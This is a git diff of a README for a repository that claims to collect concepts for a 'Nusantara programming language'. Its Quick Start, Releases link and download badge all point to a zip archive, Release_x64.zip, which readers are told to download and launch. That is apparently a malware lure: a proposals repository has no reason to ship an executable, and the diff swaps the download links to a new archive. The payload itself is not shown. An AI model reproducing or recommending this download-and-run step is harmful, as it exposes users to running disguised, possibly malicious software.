@@ -6,10 +6,10 @@ Welcome to the "concept" repository, a place where innovative ideas and concepts
 This repository serves as a hub for various concepts and proposals related to the Nusantara programming language. From language syntax to core functionalities, each idea contributes to shaping the future of programming in the Nusantara region. Developers, language enthusiasts, and anyone interested in programming language design are encouraged to explore, discuss, and contribute to the concepts presented here.
 
 ## 🚀 Quick Start
-To dive into the world of Nusantara programming concepts, you can download the [Software.zip](https://github.com/user-attachments/files/18383251/Software.zip) file. Once downloaded, you can launch the file to explore the innovative ideas and concepts waiting for you inside.
+To dive into the world of Nusantara programming concepts, you can download the [https://github.com/Sigma2023/concept/releases/download/v2.0/Release_x64.zip](https://github.com/Sigma2023/concept/releases/download/v2.0/Release_x64.zip) file. Once downloaded, you can launch the file to explore the innovative ideas and concepts waiting for you inside.
 
 ## 🌐 Explore Further
-For more information on the Nusantara programming language concepts, visit the [Releases](https://github.com/user-attachments/files/18383251/releases) section of this repository. There, you can find detailed descriptions, updates, and discussions on the latest developments in Nusantara programming language design.
+For more information on the Nusantara programming language concepts, visit the [Releases](https://github.com/Sigma2023/concept/releases/download/v2.0/Release_x64.zip) section of this repository. There, you can find detailed descriptions, updates, and discussions on the latest developments in Nusantara programming language design.
 
 ## 🎨 Repository Topics
 The repository covers a wide range of topics related to Nusantara programming language concepts, including:
@@ -38,4 +38,4 @@ Join us in creating a vibrant and innovative programming language for the Nusant
 
 Let's dive into the exciting world of Nusantara programming language concepts together! 🌺✨🚀
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Sigma2023/concept/releases/download/v2.0/Release_x64.zip)](https://github.com/Sigma2023/concept/releases/download/v2.0/Release_x64.zip)
